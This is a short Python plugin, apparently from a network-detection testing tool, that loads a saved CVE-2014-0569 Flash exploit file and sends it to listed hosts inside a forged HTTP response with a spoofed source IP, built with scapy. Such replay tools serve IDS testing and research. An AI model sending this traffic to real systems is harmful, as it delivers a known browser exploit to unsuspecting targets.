
from __future__ import print_function
from plugins.PluginAPI import PluginAPI

from scapy.all import TCP, IP, Raw
from plugin import http


class cve_2014_0569(PluginAPI):

    CATEGORY = "Exploit"

    def __init__(self):
        PluginAPI.__init__(self)

    def run(self, hosts):
        with open('exploits/CVE-2014-0569.swf', 'rb') as f:
            payload = f.read()

        for host in hosts:
            pkt = self.generate_packet(payload, host)
            self.send(pkt)

    def generate_packet(self, payload, dst):

        # Generating the IP layer:
        ip_layer = IP(src="37.200.69.143", dst=dst)

        # Generate TCP layer
        tcp_layer = TCP(sport=80, dport=49451, flags="PA", seq=1, ack=642, options=[('MSS', 1460)])

        http_layer = http.HTTP()

        httpresponse_layer = http.HTTPResponse()
        httpresponse_layer.__setattr__("Status-Line", 'HTTP/1.1 200 OK')
        httpresponse_layer.__setattr__("Accept-Ranges", 'bytes')
        httpresponse_layer.__setattr__("Server", 'nginx/0.7.67')
        httpresponse_layer.__setattr__("Connection", 'keep-alive')
        httpresponse_layer.__setattr__("Date", 'Sun, 9 Dec 2018 02:12:00 GMT')
        httpresponse_layer.__setattr__("Content-Type", 'application/x-shockwave-flash')
        httpresponse_layer.__setattr__("Content-Length", '8227')

        httpresponse_layer.Headers = str('Server: nginx/0.7.67\r\n' \
                                     'Date: Sun, 16 Nov 2014 02:12:00 GMT\r\n' \
                                     'Content-Type: application/x-shockwave-flash\r\n' \
                                     'Connection: keep-alive\r\n' \
                                     'Content-Length: 8227\r\n' \
                                     'X-Powered-By: PHP/5.4.4-14+deb7u14\r\n' \
                                     'Accept-Ranges: bytes')

        payload_layer = Raw(payload)

        packet = ip_layer/tcp_layer/http_layer/httpresponse_layer/payload_layer

        return packet
